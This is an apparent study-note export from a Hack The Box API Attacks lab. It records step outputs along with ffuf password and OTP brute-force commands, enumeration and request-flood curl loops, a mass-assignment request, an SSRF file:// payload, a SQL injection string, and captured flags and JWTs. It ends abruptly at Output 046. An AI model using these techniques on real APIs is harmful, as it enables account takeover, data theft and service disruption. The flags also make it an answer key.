---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "API Attacks"
output_topics: 50
---

# API Attacks — Outputs 001–050

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

Return to [[Outputs/Modules/API Attacks Outputs|API Attacks output index]].

## Outputs

> [!output]+ 🟨 Output 001
> Kestrel
>
> **Source path:** API Attacks → API Building Styles → Inlanefreight E-Commerce Marketplace → LAB → Interact with any endpoint and inspect the response headers; what is the name of the server that the web API uses? → Kestrel
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c6bf2bed-f7fe-4a13-8dae-7c840561704b -->

> [!output]+ 🟨 Output 002
> /api/v1/roles/current-user
>
> **Source path:** API Attacks → API Building Styles → Inlanefreight E-Commerce Marketplace → LAB → There is only one endpoint belonging to the Roles group. Submit its path. → /api/v1/roles/current-user
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: df519185-f890-4606-97a5-c0b80b036da8 -->

> [!output]+ 🟨 Output 003
> responds with the role SupplierCompanies_GetYearlyReportByID
>
> **Source path:** API Attacks → Broken Object Level Authorization (BOLA) → Scenario → examining the endpoints → /api/v1/suppliers/current-user → lock → retrieve our current user's roles → /api/v1/roles/current-user → responds with the role SupplierCompanies_GetYearlyReportByID
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 76b00101-0208-4a39-8f5f-e1dc4af75180 -->

> [!output]+ 🟨 Output 004
> company ID f9e58492-b594-4d82-a4de-16e4f230fce1
>
> **Source path:** API Attacks → Broken Object Level Authorization (BOLA) → Scenario → examining the endpoints → /api/v1/suppliers/current-user → lock → retrieve our current user's roles → In the Supplier-Companies group, → endpoint related to the role SupplierCompanies_GetYearlyReportByID → GET parameter: /api/v1/supplier-companies/yearly-reports/{ID} → requires → accepts the ID parameter as an integer and not a Guid → use 1 as the ID → company ID f9e58492-b594-4d82-a4de-16e4f230fce1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a60445c9-fc0e-49da-93fb-af3a2491099e -->

> [!output]+ 🟨 Output 005
> ID must be integer
>
> **Source path:** API Attacks → Broken Object Level Authorization (BOLA) → LAB → Exploit another Broken Object Level Authorization vulnerability and submit the flag. → look for interesting endpoint → /api/v1/suppliers/quarterly-reports/{ID} → put our id b75a7c76-e149-4ca7-9c55-d9fc4ffa87be → ID must be integer
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2f6e9cd5-2d7f-4c59-a889-f603c9b88ccd -->

> [!output]+ 🟨 Output 006
> "id": 8
> "commentsFromManager": "HTB{e76651e1f516eb5d7260621c26754776}"
>
> **Source path:** API Attacks → Broken Object Level Authorization (BOLA) → LAB → Exploit another Broken Object Level Authorization vulnerability and submit the flag. → enumerate the first 20 ID → for ((i=1; i&lt;= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://154.57.164.78:31958/api/v1/suppliers/quarterly-reports/'$i''   -H 'accept: application/json'   -H 'Authorization: Bearer eyJ...(. .etc JWT token)' | jq; done → "id": 8 "commentsFromManager": "HTB{e76651e1f516eb5d7260621c26754776}"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5e0e7f54-8955-4b27-9962-4e2ecf3b65c6 -->

> [!output]+ 🟨 Output 007
> Invalid Credentials
>
> **Source path:** API Attacks → Broken Authentication → Scenario → perform password brute-forcing against customers using ffuf → /api/v1/authentication/customers/sign-in → we need to obtain the (fail) message → Invalid Credentials
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 919e927b-26f0-4e16-9d09-25480414efa7 -->

> [!output]+ 🟨 Output 008
> [Status: 200, Size: 393, Words: 1, Lines: 1, Duration: 81ms]
>     * EMAIL: IsabellaRichardson@gmail.com
>     * PASS: qwerasdfzxcv
>
> **Source path:** API Attacks → Broken Authentication → Scenario → perform password brute-forcing against customers using ffuf → fuzzing two parameters → -w flag of ffuf and assign the keywords EMAIL and PASS → ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100 → [Status: 200, Size: 393, Words: 1, Lines: 1, Duration: 81ms]      * EMAIL: IsabellaRichardson@gmail.com      * PASS: qwerasdfzxcv
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a77b1af3-aa49-4275-b642-14f4854a7100 -->

> [!output]+ 🟨 Output 009
> {
>       "id": "53428a83-8591-4548-a553-c434ad76a61a",
>       "name": "Mason Jenkins",
>       "email": "MasonJenkins@ymail.com",
>       "phoneNumber": "+44 7451 162707",
>       "birthDate": "1985-09-16"
>     }
>
> **Source path:** API Attacks → Broken Authentication → LAB → Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag. → /api/v1/customers → {        "id": "53428a83-8591-4548-a553-c434ad76a61a",        "name": "Mason Jenkins",        "email": "MasonJenkins@ymail.com",        "phoneNumber": "+44 7451 162707",        "birthDate": "1985-09-16"      }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e4ad594e-9b5f-425e-9a78-ae75708e87f5 -->

> [!output]+ 🟨 Output 010
> success
>
> **Source path:** API Attacks → Broken Authentication → LAB → Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag. → Ask for restet (Sending OTP) → /api/v1/authentication/customers/passwords/resets/email-otps → success
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3a293b69-6dbf-43dc-86a2-c0f25e263749 -->

> [!output]+ 🟨 Output 011
> 5045
>
> **Source path:** API Attacks → Broken Authentication → LAB → Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag. → brute-force OTP → ffuf -u http://154.57.164.78:30086/api/v1/authentication/customers/passwords/resets -w otp.txt -X POST -H "Content-type: application/json" -d '{"Email": "MasonJenkins@ymail.com","OTP": "FUZZ","NewPassword": "qwerasdfzxcv"}' -fs 23 → 5045
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d5339ac5-5796-4928-9425-35d023bfde16 -->

> [!output]+ 🟨 Output 012
> "accountNumber": "HTB{115a6329120e9eff13c4ec6a63343ed1}"
>
> **Source path:** API Attacks → Broken Authentication → LAB → Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag. → Get the Payment Method → /api/v1/customers/payment-options/current-user → "accountNumber": "HTB{115a6329120e9eff13c4ec6a63343ed1}"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6010f397-d0d4-4d29-8198-d213d3567fe8 -->

> [!output]+ 🟨 Output 013
> "name": "PentesterCompany"
> "isExemptedFromMarketplaceFee": 0
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → Improperly Controlled Modification of Dynamically-Determined Object Attributes → Scenario → /api/v1/supplier-companies/current-user → "name": "PentesterCompany" "isExemptedFromMarketplaceFee": 0
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ffb03a6d-a791-4c35-91fc-8e545dcd1a6c -->

> [!output]+ 🟨 Output 014
> "Suppliers_Get",
>     "Suppliers_GetAll",
>     "SupplierCompanies_Get",
>     "SupplierCompanies_GetAll"
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → LAB → Exploit another Excessive Data Exposure vulnerability and submit the flag. → /api/v1/roles/current-user → "Suppliers_Get",      "Suppliers_GetAll",      "SupplierCompanies_Get",      "SupplierCompanies_GetAll"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 568dc4bf-7a76-472f-9278-3bd50f6e190c -->

> [!output]+ 🟨 Output 015
> "name": "HTB Academy",
> "email": "HTB{d759c70b5a9f6a392af78cc1eca9cdf0}"
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → LAB → Exploit another Excessive Data Exposure vulnerability and submit the flag. → /api/v1/supplier-companies → we can see all suplliers → "name": "HTB Academy", "email": "HTB{d759c70b5a9f6a392af78cc1eca9cdf0}"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1e0a8a7a-4397-4df4-b69d-714351edd042 -->

> [!output]+ 🟨 Output 016
> {
>   "products": [
>     {
>       "id": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
>       "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
>       "name": "Smart Home Hub",
>       "price": 25.5,
>       "pngPhotoFileURI": "NotProvidedYet"
>     }
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → LAB → Exploit another Mass Assignment vulnerability and submit the flag. → /api/v1/products → we can see all products → {   "products": [     {       "id": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",       "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",       "name": "Smart Home Hub",       "price": 25.5,       "pngPhotoFileURI": "NotProvidedYet"     }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7ad64cfd-3b87-4ac0-a4da-a2315d3c546e -->

> [!output]+ 🟨 Output 017
> "CustomerOrders_GetByID",
>     "CustomerOrders_Create"
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → LAB → Exploit another Mass Assignment vulnerability and submit the flag. → /api/v1/roles/current-user → "CustomerOrders_GetByID",     "CustomerOrders_Create"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4e3db53b-b64b-4ea3-8c0c-f148469228e4 -->

> [!output]+ 🟨 Output 018
> "CustomerOrderItems_Get"
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → LAB → Exploit another Mass Assignment vulnerability and submit the flag. → /api/v1/roles/current-user → "CustomerOrderItems_Get"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f44d85a1-1197-47de-81ca-5ffa7a3cc57d -->

> [!output]+ 🟨 Output 019
> "CustomerOrderItems_Create"
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → LAB → Exploit another Mass Assignment vulnerability and submit the flag. → /api/v1/roles/current-user → "CustomerOrderItems_Create"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 445da0c9-a55e-4d4e-9320-c37dcef88c96 -->

> [!output]+ 🟨 Output 020
> {
>   "id": "e7014e7e-6830-4d00-97ae-95a4d02d73a4"
> }
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → LAB → Exploit another Mass Assignment vulnerability and submit the flag. → /api/v1/roles/current-user → "CustomerOrderItems_Create" → POST /api/v1/customers/orders → {    "Date": "2026-05-20"  } → {   "id": "e7014e7e-6830-4d00-97ae-95a4d02d73a4" }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c2806fd2-cf66-4131-8a15-247e89e8491f -->

> [!output]+ 🟨 Output 021
> {
>   "SuccessStatus": true,
>   "Message": "HTB{4d86794f82046e465ca29d91bdbe5bca}"
> }
>
> **Source path:** API Attacks → Broken Object Property Level Authorization → LAB → Exploit another Mass Assignment vulnerability and submit the flag. → /api/v1/roles/current-user → "CustomerOrderItems_Create" → POST /api/v1/customers/orders/item → {   "OrderID": "e7014e7e-6830-4d00-97ae-95a4d02d73a4",   "OrderItems": [     {       "ProductID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",       "Quantity": 1,       "NetSum": 0     }   ] } → {    "SuccessStatus": true,    "Message": "HTB{4d86794f82046e465ca29d91bdbe5bca}"  }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 781aadaa-dcd6-4a34-bfc5-14061e717990 -->

> [!output]+ 🟨 Output 022
> SupplierCompanies_Get
>
> **Source path:** API Attacks → Unrestricted Resource Consumption → Scenario → /api/v1/roles/current-user → SupplierCompanies_Get
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 914a2323-324c-47f4-aa53-be272eac1501 -->

> [!output]+ 🟨 Output 023
> SupplierCompanies_UploadCertificateOfIncorporation
>
> **Source path:** API Attacks → Unrestricted Resource Consumption → Scenario → /api/v1/roles/current-user → SupplierCompanies_UploadCertificateOfIncorporation
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ff8d788d-d31e-4822-96c6-cbb40eeacef9 -->

> [!output]+ 🟨 Output 024
> b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
>
> **Source path:** API Attacks → Unrestricted Resource Consumption → Scenario → /api/v1/supplier-companies/current-user → get the supplier-company ID → b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: dc294891-190c-4a73-89e4-9e8f459641ea -->

> [!output]+ 🟨 Output 025
> successful upload message
>
> **Source path:** API Attacks → Unrestricted Resource Consumption → Scenario → POST → /api/v1/supplier-companies/certificates-of-incorporation → create a file containing 30 random megabytes and assign it the .pdf extension → dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30 → upload the file → successful upload message
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b3dfe5cb-8669-406c-a1fa-6157f7f043bb -->

> [!output]+ 🟨 Output 026
> successful
>
> **Source path:** API Attacks → Unrestricted Resource Consumption → Scenario → POST → /api/v1/supplier-companies/certificates-of-incorporation → test whether the endpoint allows uploading files other than PDF files → dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10 → successful
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bc72f688-d651-4770-b297-ab956d0f61b5 -->

> [!output]+ 🟨 Output 027
> {"SuccessStatus":false}
> {"SuccessStatus":false}
> {"flag":"HTB{01de742d8cd942ad682aeea9ce3c5428}"}
>
> **Source path:** API Attacks → Unrestricted Resource Consumption → LAB → Exploit another Unrestricted Resource Consumption vulnerability and submit the flag. → /api/v1/authentication/customers/passwords/resets/sms-otps → create bash loop to consume resources → while true; do curl -s -X POST 'http://154.57.164.81:32431/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email":"htbpentester8@pentestercompany.com"}'; echo; done → {"SuccessStatus":false} {"SuccessStatus":false} {"flag":"HTB{01de742d8cd942ad682aeea9ce3c5428}"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4003ce36-98a9-406b-8426-06c6767fd644 -->

> [!output]+ 🟨 Output 028
> User does not have any roles assigned
>
> **Source path:** API Attacks → Broken Function Level Authorization → LAB → Exploit another Broken Function Level Authorization vulnerability and submit the flag. → /api/v1/roles/current-user → User does not have any roles assigned
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 55fe24a9-cad0-454f-b65c-8324b507e14d -->

> [!output]+ 🟨 Output 029
> "customerID": "9076351f-e6b8-4445-84e3-72800c79dd1d",
>       "city": "Kent",
>       "country": "England",
>       "street": "HTB{1e2095c564baf0d2d316080217040dae}",
>       "postalCode": 19553
>
> **Source path:** API Attacks → Broken Function Level Authorization → LAB → Exploit another Broken Function Level Authorization vulnerability and submit the flag. → /api/v1/customers/billing-addresses → "customerID": "9076351f-e6b8-4445-84e3-72800c79dd1d",       "city": "Kent",       "country": "England",       "street": "HTB{1e2095c564baf0d2d316080217040dae}",       "postalCode": 19553
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d5989aa3-3151-4439-9e2c-d5c264c1bce2 -->

> [!output]+ 🟨 Output 030
> "street": "788 Sauchiehall St.",
>
> **Source path:** API Attacks → Unrestricted Access to Sensitive Business Flows → LAB → Based on the previous vulnerability, exploit the Unrestricted Access to Sensitive Business Flow vulnerability and submit the street address where the user with the ID 'daa8c984-ba84-4265-8d88-12d6607e511c' lives. → /api/v1/customers/billing-addresses → "street": "788 Sauchiehall St.",
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 09e96e03-c755-44ab-bf6c-f14753bc03f4 -->

> [!output]+ 🟨 Output 031
> b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
>
> **Source path:** API Attacks → Server Side Request Forgery → Scenario → /api/v1/supplier-companies/current-user → b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fd9d70d8-51ad-40e0-a4a7-4ff27be36c53 -->

> [!output]+ 🟨 Output 032
> "SupplierCompanies_Update",
>     "SupplierCompanies_UploadCertificateOfIncorporation",
>     "Products_CreateByCurrentUser",
>     "Products_Update",
>     "Products_UploadPhoto"
>
> **Source path:** API Attacks → Server Side Request Forgery → LAB → Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'. → /api/v1/roles/current-user → "SupplierCompanies_Update",      "SupplierCompanies_UploadCertificateOfIncorporation",      "Products_CreateByCurrentUser",      "Products_Update",      "Products_UploadPhoto"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 54463de9-0485-42b4-8ffc-2850dd38c74e -->

> [!output]+ 🟨 Output 033
> {
>   "successStatus": true,
>   "productID": "a919add6-7b47-4391-ba50-c464a1b295c1"
> }
>
> **Source path:** API Attacks → Server Side Request Forgery → LAB → Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'. → /api/v1/products/current-user → POST → {   "NewProduct": {     "Name": "rayanflag2",     "Price": 7,     "PNGPhotoFileURI": "not"   } } → {   "successStatus": true,   "productID": "a919add6-7b47-4391-ba50-c464a1b295c1" }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e41bd4e7-e68f-465a-88e0-f67e464ed093 -->

> [!output]+ 🟨 Output 034
> "id": "47723251-c9e1-4eca-ad84-18c4cd971e82",
>       "supplierID": "5d489453-3538-4973-9479-2c37b2a5db73",
>       "name": "rayanflag2",
>       "price": 7,
>       "pngPhotoFileURI": ""
>
> **Source path:** API Attacks → Server Side Request Forgery → LAB → Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'. → /api/v1/products/current-supplier-company → we can see all the products we made → "id": "47723251-c9e1-4eca-ad84-18c4cd971e82",       "supplierID": "5d489453-3538-4973-9479-2c37b2a5db73",       "name": "rayanflag2",       "price": 7,       "pngPhotoFileURI": ""
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e114cf39-f575-420f-9274-7a89e2fa6c29 -->

> [!output]+ 🟨 Output 035
> {
>   "SuccessStatus": true
> }
>
> **Source path:** API Attacks → Server Side Request Forgery → LAB → Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'. → /api/v1/products/current-user → PATCH → {   "UpdatedProduct": {     "ProductID": "a919add6-7b47-4391-ba50-c464a1b295c1",     "Name": "rayanflag2",     "Price": 7,     "PNGPhotoFileURI": "file:///etc/flag.conf"   } } → {   "SuccessStatus": true }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7542044c-943c-48b3-b3a7-1ae7ae773a3c -->

> [!output]+ 🟨 Output 036
> {
>   "successStatus": true,
>   "base64Data": "SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo="
> }
>
> **Source path:** API Attacks → Server Side Request Forgery → LAB → Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'. → /api/v1/products/a919add6-7b47-4391-ba50-c464a1b295c1/photo → a919add6-7b47-4391-ba50-c464a1b295c1 → {   "successStatus": true,   "base64Data": "SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo=" }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 893e8406-7b36-4357-8a14-d9ab2febf849 -->

> [!output]+ 🟨 Output 037
> HTB{3c94232c4f0b0a544ae4024833eef0b3}
>
> **Source path:** API Attacks → Server Side Request Forgery → LAB → Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'. → /api/v1/products/a919add6-7b47-4391-ba50-c464a1b295c1/photo → a919add6-7b47-4391-ba50-c464a1b295c1 → {   "successStatus": true,   "base64Data": "SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo=" } → decode base64 → HTB{3c94232c4f0b0a544ae4024833eef0b3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0f8f712c-6e40-4985-8d9d-041f3b9ef50d -->

> [!output]+ 🟨 Output 038
> 151
>
> **Source path:** API Attacks → Security Misconfiguration → LAB → Exploit another Security Misconfiguration and provide the total count of records within the target table. → /api/v1/suppliers/{name}/count → lap' OR 1=1 -- → 151
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 591a667a-4b22-44ba-8c45-4d0212a83482 -->

> [!output]+ 🟨 Output 039
> access-control-allow-origin: *
>
> **Source path:** API Attacks → Security Misconfiguration → LAB → Submit the header and its value that expose another Security Misconfiguration in the API. → /api/v1/authentication/customers/sign-in → access-control-allow-origin: *
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 259dbfc5-a32e-4cbe-b561-d5fde10effec -->

> [!output]+ 🟨 Output 040
> HTB{43c2754afea99eba70fb2c8dc443c660}
>
> **Source path:** API Attacks → Improper Inventory Management → LAB → Exploit the Improper Inventory Management vulnerability and submit the value of the 'Email' field from the deleted Supplier Company with the ID 'c250cb38-96e3-4ccf-9df2-0a03146a2d0b'. → HTB{43c2754afea99eba70fb2c8dc443c660}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 199f6446-2bb2-41ad-a39d-64f8a83d2424 -->

> [!output]+ 🟨 Output 041
> 006006C3167E90A7575A12E474218D86
>
> **Source path:** API Attacks → Unsafe Consumption of APIs → LAB → If v1 of Inlanefreight's E-Commerce Marketplace accepted data from the '/api/v0/suppliers/deleted' endpoint unsafely, what would the password hash of 'Yara MacDonald' be in v1? → v0 → 006006C3167E90A7575A12E474218D86
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 65c4d812-a885-4b4e-aaa5-e8c0604893de -->

> [!output]+ 🟨 Output 042
> eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlckBoYWNrdGhlYm94LmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6WyJTdXBwbGllcnNfR2V0IiwiU3VwcGxpZXJzX0dldEFsbCJdLCJleHAiOjE3Nzk4MjAyMTAsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.oqITCUVWWAaZf0p_ED2J_u2dPiLRxXWol5pdCOj1k_K5GmTDwMD7BtsZoPDRhRcrrjY1HrJk-zTd_SbN_vrmzw
>
> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/authentication/customers/sign-in → {   "Email": "htbpentester@hackthebox.com",   "Password": "HTBPentester" } → obtain JWT → eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlckBoYWNrdGhlYm94LmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6WyJTdXBwbGllcnNfR2V0IiwiU3VwcGxpZXJzX0dldEFsbCJdLCJleHAiOjE3Nzk4MjAyMTAsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.oqITCUVWWAaZf0p_ED2J_u2dPiLRxXWol5pdCOj1k_K5GmTDwMD7BtsZoPDRhRcrrjY1HrJk-zTd_SbN_vrmzw
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a2b71fd1-9c33-4ddb-9b03-fcd04d5b3c8a -->

> [!output]+ 🟨 Output 043
> {
>   "roles": [
>     "Suppliers_Get",
>     "Suppliers_GetAll"
>   ]
> }
>
> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/roles/current-user → {   "roles": [     "Suppliers_Get",     "Suppliers_GetAll"   ] }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 137b5b06-5b30-48d0-8321-e40553db42db -->

> [!output]+ 🟨 Output 044
> {
>   "errorMessage": "Could not upload the CV, its either malicious or very big in size"
> }
>
> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/suppliers/current-user/cv → dd if=/dev/urandom of=cv.pdf bs=1K count=50 → even adding Magic Byte %PDF- → {   "errorMessage": "Could not upload the CV, its either malicious or very big in size" }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e6262237-53ec-413d-a7b1-df4fde42ca79 -->

> [!output]+ 🟨 Output 045
> {
>       "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",
>       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
>       "name": "Patrick Howard",
>       "email": "P.Howard1536@globalsolutions.com",
>       "securityQuestion": "What is your favorite color?",
>       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
>     },
>     {
>       "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
>       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
>       "name": "Luca Walker",
>       "email": "L.Walker1872@globalsolutions.com",
>       "securityQuestion": "What is your favorite color?",
>       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
>     },
>     {
>       "id": "fafebea0-8894-4744-b7de-6c66d5749740",
>       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
>       "name": "Tucker Harris",
>       "email": "T.Harris1814@globalsolutions.com",
>       "securityQuestion": "What is your favorite color?",
>       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
>     },
>     {
>       "id": "36f17195-395f-443e-93a4-8ceee81c6106",
>       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
>       "name": "Brandon Rogers",
>       "email": "B.Rogers1535@globalsolutions.com",
>       "securityQuestion": "What is your favorite color?",
>       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
>     },
>     {
>       "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",
>       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
>       "name": "Mason Alexander",
>       "email": "M.Alexander1650@globalsolutions.com",
>       "securityQuestion": "What is your favorite color?",
>       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
>     }
>
> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/suppliers → Role(s) required: Suppliers_GetAll → {       "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",       "name": "Patrick Howard",       "email": "P.Howard1536@globalsolutions.com",       "securityQuestion": "What is your favorite color?",       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"     },     {       "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",       "name": "Luca Walker",       "email": "L.Walker1872@globalsolutions.com",       "securityQuestion": "What is your favorite color?",       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"     },     {       "id": "fafebea0-8894-4744-b7de-6c66d5749740",       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",       "name": "Tucker Harris",       "email": "T.Harris1814@globalsolutions.com",       "securityQuestion": "What is your favorite color?",       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"     },     {       "id": "36f17195-395f-443e-93a4-8ceee81c6106",       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",       "name": "Brandon Rogers",       "email": "B.Rogers1535@globalsolutions.com",       "securityQuestion": "What is your favorite color?",       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"     },     {       "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",       "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",       "name": "Mason Alexander",       "email": "M.Alexander1650@globalsolutions.com",       "securityQuestion": "What is your favorite color?",       "professionalCVPDFFileURI": "SupplierDidNotUploadYet"     }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 11a50233-980b-4556-a2bc-a55d94f26f85 -->

> [!output]+ 🟨 Output 046
> eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IkIuUm9nZXJzMTUzNUBnbG9iYWxzb2x1dGlvbnMuY29tIiwiZXhwIjoxNzc5ODIzODgzLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.LjpL03yr5l0-Oph3ATkbwbmolMDWSbpmk6iwOhSzlpxUx_W8qcUr3eWD3KDLCXv7xb4RanPnQ0555lVPb8DwCg
>
